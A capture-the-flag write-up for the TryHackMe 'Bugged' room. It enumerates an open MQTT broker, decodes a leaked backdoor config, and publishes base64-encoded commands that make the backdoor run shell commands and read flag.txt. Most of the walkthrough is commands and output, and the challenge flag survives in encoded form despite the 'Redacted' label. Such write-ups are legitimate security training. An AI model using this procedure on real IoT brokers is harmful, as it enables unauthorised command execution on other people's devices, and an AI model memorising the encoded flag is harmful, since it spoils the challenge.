# Bugged

## Introduction

Welcome to my another writeup! In this TryHackMe [Bugged](https://tryhackme.com/room/bugged) room, you'll learn: MQTT enumeration & exploitation and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Exploitation](#exploitation)**
3. **[Conclusion](#conclusion)**

## Background

> John likes to live in a very Internet connected world. Maybe too connected...
>  
> Difficulty: Easy

---

John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|15:29:10(HKT)]
└> export RHOSTS=10.10.230.83
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|15:32:51(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE                  REASON  VERSION
1883/tcp open  mosquitto version 2.0.14 syn-ack
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/publish/bytes/sent: 292
|     $SYS/broker/store/messages/count: 34
|     $SYS/broker/clients/active: 2
|     $SYS/broker/clients/total: 2
|     $SYS/broker/messages/sent: 424
|     $SYS/broker/bytes/sent: 3833
|     $SYS/broker/retained messages/count: 36
|     $SYS/broker/load/messages/received/1min: 90.47
|     $SYS/broker/load/publish/sent/1min: 25.58
|     $SYS/broker/load/sockets/15min: 0.32
|     $SYS/broker/load/messages/sent/1min: 116.05
|     patio/lights: {"id":7913336924184876236,"color":"GREEN","status":"OFF"}
|     $SYS/broker/store/messages/bytes: 271
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/subscriptions/count: 3
|     $SYS/broker/load/messages/sent/15min: 23.42
|     $SYS/broker/load/bytes/sent/15min: 160.11
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/load/publish/sent/15min: 1.86
|     $SYS/broker/uptime: 242 seconds
|     $SYS/broker/load/messages/received/15min: 21.56
|     storage/thermostat: {"id":11696621372226139826,"temperature":23.272274}
|     $SYS/broker/load/bytes/received/5min: 2406.77
|     $SYS/broker/load/bytes/received/1min: 4277.36
|     $SYS/broker/load/bytes/sent/5min: 421.28
|     kitchen/toaster: {"id":6838968361453865170,"in_use":true,"temperature":145.21776,"toast_time":226}
|     $SYS/broker/load/connections/5min: 0.48
|     frontdeck/camera: {"id":584076498117250510,"yaxis":83.23074,"xaxis":152.24701,"zoom":0.46275857,"movement":false}
|     $SYS/broker/publish/messages/sent: 56
|     $SYS/broker/publish/bytes/received: 12525
|     $SYS/broker/load/connections/15min: 0.18
|     $SYS/broker/messages/stored: 34
|     $SYS/broker/load/bytes/received/15min: 1027.53
|     $SYS/broker/load/connections/1min: 1.85
|     $SYS/broker/load/sockets/5min: 0.87
|     livingroom/speaker: {"id":7343543974120247098,"gain":49}
|     $SYS/broker/load/bytes/sent/1min: 1379.73
|     $SYS/broker/load/sockets/1min: 3.52
|     $SYS/broker/load/publish/sent/5min: 5.50
|     $SYS/broker/messages/received: 369
|     $SYS/broker/load/messages/received/5min: 50.61
|     $SYS/broker/bytes/received: 17605
|     $SYS/broker/clients/connected: 2
|_    $SYS/broker/load/messages/sent/5min: 56.11
```

According to `rustscan` result, we have 1 port is opened:

Open Ports        | Service
------------------|------------------------
1883              | MQTT (Mosquitto)

### MQTT (Mosquitto) on Port 1883

In here, we see there's one of the IoT protocols: **MQTT**.

> MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, **extremely simple and lightweight messaging protocol**, designed for constrained devices and low-bandwidth, high-latency or unreliable networks. The design principles are to minimise network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal of the emerging “machine-to-machine” (M2M) or “Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.

**Now, we can use `mosquitto_sub` client utility to subscribe to an MQTT broker:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|15:45:33(HKT)]
└> mosquitto_sub -h $RHOSTS -t '#' -v               
storage/thermostat {"id":17080218027943052895,"temperature":23.488384}
frontdeck/camera {"id":18006163071683210625,"yaxis":129.00482,"xaxis":87.10443,"zoom":3.5009263,"movement":false}
patio/lights {"id":11023791655233295504,"color":"GREEN","status":"ON"}
kitchen/toaster {"id":13560199698833326201,"in_use":false,"temperature":143.5374,"toast_time":269}
livingroom/speaker {"id":5863489747759744866,"gain":57}
storage/thermostat {"id":2707059671892441183,"temperature":24.304647}
livingroom/speaker {"id":18340026158428788461,"gain":42}
patio/lights {"id":5343298687617889937,"color":"RED","status":"OFF"}
storage/thermostat {"id":7716820934539350679,"temperature":23.969189}
kitchen/toaster {"id":3219557924390887873,"in_use":false,"temperature":142.64139,"toast_time":265}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
frontdeck/camera {"id":8323131899510774859,"yaxis":-164.11926,"xaxis":6.507782,"zoom":2.373652,"movement":false}
[...]
```

> Note: The `#` is subscribe to every topic.

**In the output, we see there's a weird topic: `yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config`**
```
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

It has a base64 encoded string (You can tell it's base64 is because the last character is `=`, which is a padding character in base64 encoding).

**Let's decode that!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|15:46:39(HKT)]
└> echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Hmm... We see there's some `registered_commands`: `["HELP","CMD","SYS"]`.

**We can also see that there are 2 topics, 1 for publish, 1 for subscribe:**
```
"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
"sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
```

## Exploitation

**Next, we can use `mosquitto_sub` to subscribe to those topics:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:08:55(HKT)]
└> mosquitto_sub -h $RHOSTS -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -v
```

**Then, use `mosquitto_pub` to publish that topic:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:09:24(HKT)]
└> mosquitto_pub -h $RHOSTS -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'HELP'
```

**Subscribe:**
```
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub HELP
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```

**We see more base64 encoded string! Again, decode it:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:06:38(HKT)]
└> echo 'SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=' | base64 -d          
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Oh! We got something!

When we send a message to `XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub` ***without base64 encoded***, it returns:

```
Invalid message format.
```

**And the format:**
```json
base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

With that said, we need to **provide the `id`, `cmd`, and `arg` in base64**.

**Let's get the `HELP` output, as we wanna know what that topic can do:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:13:03(HKT)]
└> echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP", "arg": ""}' | base64
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:13:17(HKT)]
└> mosquitto_pub -h $RHOSTS -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9'
```

```
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==
```

**Decoded:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:14:03(HKT)]
└> echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
```

**JSON beautified:**
```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "Message format:
    Base64({
        "id": "<Backdoor ID>",
        "cmd": "<Command>",
        "arg": "<arg>",
    })

Commands:
    HELP: Display help message (takes no arg)
    CMD: Run a shell command
    SYS: Return system information (takes no arg)
"
}
```

**Hmm... Let's try to run `SYS` command:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:14:21(HKT)]
└> echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "SYS", "arg": ""}' | base64
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIlNZUyIsICJhcmciOiAiIn0=

┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:14:35(HKT)]
└> mosquitto_pub -h $RHOSTS -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIlNZUyIsICJhcmciOiAiIn0='
```

```
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIlNZUyIsICJhcmciOiAiIn0=
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTGludXggeDY0IDUuNC4wLTEwNS1nZW5lcmljIn0=
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:18:37(HKT)]
└> echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTGludXggeDY0IDUuNC4wLTEwNS1nZW5lcmljIn0=' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Linux x64 5.4.0-105-generic"}
```

Cool! We found the kernel version of John's machine!

**Armed with above information, we can try to run the `CMD` command:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:23:23(HKT)]
└> echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls -lah"}' | base64
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMgLWxhaCJ9
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:23:30(HKT)]
└> mosquitto_pub -h $RHOSTS -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMgLWxhaCJ9'
```

```
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMgLWxhaCJ9
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidG90YWwgMzJLXG5kcnd4ci14ci14IDEgY2hhbGxlbmdlIGNoYWxsZW5nZSA0LjBLIE1hciAyMiAgMjAyMiAuXG5kcnd4ci14ci14IDEgcm9vdCAgICAgIHJvb3QgICAgICA0LjBLIE1hciAyMiAgMjAyMiAuLlxuLXJ3LS0tLS0tLSAxIGNoYWxsZW5nZSBjaGFsbGVuZ2UgICAyOCBNYXIgMjIgIDIwMjIgLmJhc2hfaGlzdG9yeVxuLXJ3LXItLXItLSAxIGNoYWxsZW5nZSBjaGFsbGVuZ2UgIDIyMCBBdWcgIDQgIDIwMjEgLmJhc2hfbG9nb3V0XG4tcnctci0tci0tIDEgY2hhbGxlbmdlIGNoYWxsZW5nZSAzLjVLIEF1ZyAgNCAgMjAyMSAuYmFzaHJjXG4tcnctci0tci0tIDEgY2hhbGxlbmdlIGNoYWxsZW5nZSAgODA3IEF1ZyAgNCAgMjAyMSAucHJvZmlsZVxuLXJ3LXItLXItLSAxIHJvb3QgICAgICByb290ICAgICAgICAzOSBNYXIgMjEgIDIwMjIgZmxhZy50eHRcbiJ9
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:23:36(HKT)]
└> echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidG90YWwgMzJLXG5kcnd4ci14ci14IDEgY2hhbGxlbmdlIGNoYWxsZW5nZSA0LjBLIE1hciAyMiAgMjAyMiAuXG5kcnd4ci14ci14IDEgcm9vdCAgICAgIHJvb3QgICAgICA0LjBLIE1hciAyMiAgMjAyMiAuLlxuLXJ3LS0tLS0tLSAxIGNoYWxsZW5nZSBjaGFsbGVuZ2UgICAyOCBNYXIgMjIgIDIwMjIgLmJhc2hfaGlzdG9yeVxuLXJ3LXItLXItLSAxIGNoYWxsZW5nZSBjaGFsbGVuZ2UgIDIyMCBBdWcgIDQgIDIwMjEgLmJhc2hfbG9nb3V0XG4tcnctci0tci0tIDEgY2hhbGxlbmdlIGNoYWxsZW5nZSAzLjVLIEF1ZyAgNCAgMjAyMSAuYmFzaHJjXG4tcnctci0tci0tIDEgY2hhbGxlbmdlIGNoYWxsZW5nZSAgODA3IEF1ZyAgNCAgMjAyMSAucHJvZmlsZVxuLXJ3LXItLXItLSAxIHJvb3QgICAgICByb290ICAgICAgICAzOSBNYXIgMjEgIDIwMjIgZmxhZy50eHRcbiJ9' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"total 32K\ndrwxr-xr-x 1 challenge challenge 4.0K Mar 22  2022 .\ndrwxr-xr-x 1 root      root      4.0K Mar 22  2022 ..\n-rw------- 1 challenge challenge   28 Mar 22  2022 .bash_history\n-rw-r--r-- 1 challenge challenge  220 Aug  4  2021 .bash_logout\n-rw-r--r-- 1 challenge challenge 3.5K Aug  4  2021 .bashrc\n-rw-r--r-- 1 challenge challenge  807 Aug  4  2021 .profile\n-rw-r--r-- 1 root      root        39 Mar 21  2022 flag.txt\n"}
```

**Nice! It can run any OS command, and we found the flag file: `flag.txt`! Let's `cat` that!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:31:21(HKT)]
└> echo -n '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}' | base64
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNN
RCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:30:46(HKT)]
└> mosquitto_pub -h $RHOSTS -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0='
```

```
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Bugged)-[2023.03.10|16:31:34(HKT)]
└> echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{Redacted}\n"}
```

We found the flag!

# Conclusion

What we've learned:

1. MQTT Enumeration & Exploitation